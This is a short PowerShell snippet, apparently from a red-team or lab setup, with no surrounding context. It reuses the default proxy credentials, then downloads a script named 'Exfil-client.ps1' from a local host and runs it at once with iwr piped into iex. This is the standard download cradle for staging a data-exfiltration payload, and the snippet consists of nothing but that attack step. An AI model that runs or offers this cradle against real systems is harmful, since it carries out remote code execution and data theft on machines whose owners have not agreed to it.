$IP="127.0.0.1:8000"
(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('$IP/Exfil-client.ps1')|iex
